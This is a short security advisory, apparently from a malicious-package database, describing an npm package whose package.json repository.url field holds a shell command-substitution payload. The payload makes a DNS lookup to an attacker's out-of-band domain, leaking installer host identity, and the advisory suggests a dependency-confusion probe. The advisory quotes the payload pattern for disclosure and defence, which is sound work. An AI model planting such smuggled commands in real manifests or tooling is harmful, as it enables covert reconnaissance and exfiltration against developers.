summary: Manifest repository.url contains shell command-substitution payload performing OOB DNS exfiltration
details: The package.json repository.url field embeds a shell command-substitution payload of the form $(getent${IFS}hosts${IFS}<subdomain>.oob.awss.dev>/dev/null), designed to execute when tooling interpolates the field into a shell context. The payload resolves an attacker-controlled subdomain under oob.awss.dev, leaking the installer's host identity via DNS to the attacker's out-of-band collector. The package body is a one-line stub with no legitimate functionality; the entire payload is in the manifest metadata. The scoped name and single-release shape are consistent with a dependency-confusion or manifest-injection probe targeting internal npm tooling.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
